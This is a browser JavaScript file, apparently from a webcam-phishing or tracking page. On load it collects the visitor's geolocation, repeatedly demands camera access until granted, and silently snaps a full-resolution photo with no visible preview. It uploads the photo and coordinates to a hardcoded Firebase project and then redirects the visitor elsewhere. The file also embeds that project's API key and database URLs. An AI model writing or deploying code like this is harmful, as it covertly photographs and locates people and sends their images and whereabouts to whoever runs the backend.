// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = null;

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            userLocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            saveLocation(userLocation);
        }, (error) => {
            console.error('Error accessing location:', error);
            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
}

// Function to save location to Firebase
function saveLocation(location) {
    const locationRef = database.ref('locations').push();
    locationRef.set(location, (error) => {
        if (error) {
            console.error('Error saving location to Firebase:', error);
        } else {
            console.log('Location saved to Firebase');
        }
    });
}

// Access the camera with higher resolution and request permission until granted
async function startVideo() {
    let accessGranted = false;
    while (!accessGranted) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            accessGranted = true;  // Camera access granted
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Capture photo once the video stream is ready
            video.onloadedmetadata = () => {
                capturePhoto(video);
            };
        } catch (error) {
            console.error('Error accessing camera:', error);
            document.getElementById('message').textContent = 'Camera access denied, trying again...';

            // Wait for 3 seconds before retrying
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
}

// Capture the photo and upload it to Firebase Storage
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas image to a Blob
    canvas.toBlob(async function(blob) {
        const fileName = `photo_${Date.now()}.png`;
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            await storageRef.put(blob);

            // If location is available, save it with the photo name
            if (userLocation) {
                saveLocationWithPhoto(fileName, userLocation);
            }

            // Redirect after 1 second
            setTimeout(() => {
                window.location.href = '/ESRAT/index-home.html';
            }, 1000);  // 1000 milliseconds = 1 second
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
            // Optionally handle upload failure here
        }
    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
}

// Function to save location with the photo name in Firebase
function saveLocationWithPhoto(photoName, location) {
    const locationRef = database.ref('locations_with_photos').push();
    locationRef.set({
        photo: photoName,
        location: location
    }, (error) => {
        if (error) {
            console.error('Error saving location with photo to Firebase:', error);
        } else {
            console.log('Location with photo saved to Firebase');
        }
    });
}

// Start the camera and location request on page load
window.onload = () => {
    getLocation();  // Request location permission first
    startVideo();   // Request camera permission next
};
